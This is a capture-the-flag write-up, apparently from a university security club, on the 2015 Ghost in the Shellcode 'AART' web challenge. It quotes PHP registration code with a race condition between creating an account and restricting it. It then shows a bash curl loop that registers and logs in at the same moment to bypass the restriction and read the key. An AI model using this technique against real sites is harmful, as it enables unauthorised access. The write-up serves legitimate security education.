<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>AART</title>
  <meta name="description" content="Web">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="stylesheet" href="/css/bootstrap.css">
  <script src="/js/jquery-1.10.2.min.js"></script>
  <script src="/js/bootstrap.min.js"></script>
  <link rel="canonical" href="http://afnom.net/2015/01/18/AART.html">
  <link rel="alternate" type="application/rss+xml" title="AFiniteNumberOfMonkeys" href="http://afnom.net/feed.xml" />
</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <div class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a href="http://afnom.net/" class="navbar-brand">AFiniteNumberOfMonkeys</a>
          <button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
        </div>
        <div class="navbar-collapse collapse" id="navbar-main">
          <ul class="nav navbar-nav navbar-right">
			<li class="dropdown">
			   <a class="dropdown-toggle" data-toggle="dropdown" href="http://afnom.net" id="home">Home <span class="caret"></span></a>
			   <ul class="dropdown-menu" aria-labelledby="home">
			     <li><a href="http://afnom.net/index.html#who">Who we are</a></li>
			     <li><a href="http://afnom.net/index.html#meetings">Meetings</a></li>
			     <li><a href="http://afnom.net/index.html#tools">Tools</a></li>
			     <li><a href="http://afnom.net/index.html#materials">Learning material</a></li>
			     <li><a href="http://afnom.net/index.html#contact">Contact</a></li>
			   </ul>
			 </li>
            <li><a href="http://afnom.net/writeups/index.html">Write-ups</a></li>
          </ul>

        </div>
      </div>
    </div>
</div>

        
          
        
          
        
          
        
          
        
          
        


</header>


    <div class="page-content">
      <div class="container">
        <div class="post">

  <header class="post-header">
    <h1 class="post-title">AART</h1>
    <p class="post-meta">Jan 18, 2015 • Pegasus</p>
  </header>

  <article class="post-content">
    <h2 id="web">Web</h2>

<h3 id="points">200 Points</h3>

<p>Also found <a href="http://www.rjthomas.eu/2015/01/19/afnom-ghost-in-the-shellcode-2015-ctf-write-up/">here</a>.</p>

<p>The challenge was supplied with source code which had the PHP scripts and the schema for the database running on the site. We noticed that for a while, submitted ‘artwork’ wasn’t correctly showing up on the homepage, and we assume this was fixed as we saw people trying to run different attempts.</p>

<p>From the source code, we didn’t have much to work from - we identified a few opportunities for injection, notably in the $_POST used by PHP. However, we couldn’t inject anything useful there, as the username was sanitised and the password was simply matched against entries.</p>

<p>One interesting thing we noticed however was this in register.php.</p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="x">if(isset($_POST[&#39;username&#39;])){</span>
<span class="x">  $username = mysqli_real_escape_string($conn, $_POST[&#39;username&#39;]);</span>
<span class="x">  $password = mysqli_real_escape_string($conn, $_POST[&#39;password&#39;]);</span>

<span class="x">  $sql = &quot;INSERT into users (username, password) values (&#39;$username&#39;, &#39;$password&#39;);&quot;;</span>

<span class="x">  mysqli_query($conn, $sql);</span>
<span class="x">  $sql = &quot;INSERT into privs (userid, isRestricted) values ((select users.id from users where username=&#39;$username&#39;), TRUE);&quot;;</span>
<span class="x">  mysqli_query($conn, $sql);</span>
<span class="x">  ?&gt;</span>
<span class="x">  &lt;h2&gt;SUCCESS!&lt;/h2&gt;</span></code></pre></div>

<p>So - what does this mean for us?
  Well, there’s a race condition present in this ‘snippet’ - it inserts the user details (sanitised, of course!) into the database, and then performs a second query to restrict the account (you don’t get access to the key if your user ID is present in this restricted table. Thanks to Abstract for this idea.</p>

<p>This meant we had to find a way around this bit of code:</p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="x">$uid = $row[&#39;id&#39;];</span>
<span class="x">$sql = &quot;SELECT isRestricted from privs where userid=&#39;$uid&#39; and isRestricted=TRUE;&quot;;</span>
<span class="x">$result = mysqli_query($conn, $sql);</span>
<span class="x">$row = $result-&gt;fetch_assoc();</span>
<span class="x">if($row[&#39;isRestricted&#39;]){</span>
<span class="x">  ?&gt;</span>
<span class="x">  &lt;h2&gt;This is a restricted account&lt;/h2&gt;</span>
<span class="x">  </span><span class="cp">&lt;?php</span>
  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
    <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">    &lt;h2&gt;</span><span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="s1">&#39;../key&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="x">&lt;/h2&gt;</span>
<span class="x">    </span><span class="cp">&lt;?php</span>
  <span class="p">}</span>
  <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>

<p>So - one could write something that performs some multi-threaded operations and manages to perform a login operation just as the account is registered and the privileges aren’t restricted. This is going to be a bit difficult to time correctly, so why not just use a bash script with cURL?</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
  <span class="k">for</span> i in <span class="o">{</span>1..50<span class="o">}</span>
  <span class="k">do</span>
  curl --data <span class="s2">&quot;username=leet_hackeri$i&amp;password=12345&quot;</span> http://aart.2015.ghostintheshellcode.com/register.php -s &gt;<span class="p">&amp;</span><span class="m">1</span> &gt;/dev/null <span class="p">&amp;</span>
  curl --data <span class="s2">&quot;username=leet_hackeri$i&amp;password=12345&quot;</span> http://aart.2015.ghostintheshellcode.com/login.php
  <span class="k">done</span></code></pre></div>

<p>With this done, any registration queries would be executed, but I wouldn’t be inundated with the HTML generated by the registration pages and only get the results of the login pages.</p>

<p>Over time, I started to see ‘this is a key’, instead of ‘This is a restricted account’. Now, I thought nothing of this until I saw it repeatedly inside a <code>&lt;h2&gt;</code> tag. This tied in what was in the PHP script where the privileges were not set. Submitting ‘this is a key’ as the token gave us a correct answer and the 200 Points for the challenge.</p>

<h3 id="notes">Notes</h3>

<p>For this to have worked, it’s a ‘all in or bust’ attempt. Once the account is registered, there’s no going back, so you immediately need to test it, hence why the bash script was written as it was. If we had tried this in a browser (unless we had BURP intercepting everything and we delayed until we were ready for the right time), we likely would not have succeeded.
    I’ve also seen some interesting solutions using Python and Perl, all of which are as suitable as mine, but I found this would do the work for me.</p>

  </article>

</div>

      </div>
    </div>

    <hr>
<footer class="site-footer">

  <div class="container">

    <div class="row">
      <div class="col-lg-12">

       
        <p><p>Copyright &copy; University of Birmingham 2014</p></p>

      </div>
    </div>

  </div>

</footer>


  </body>

</html>
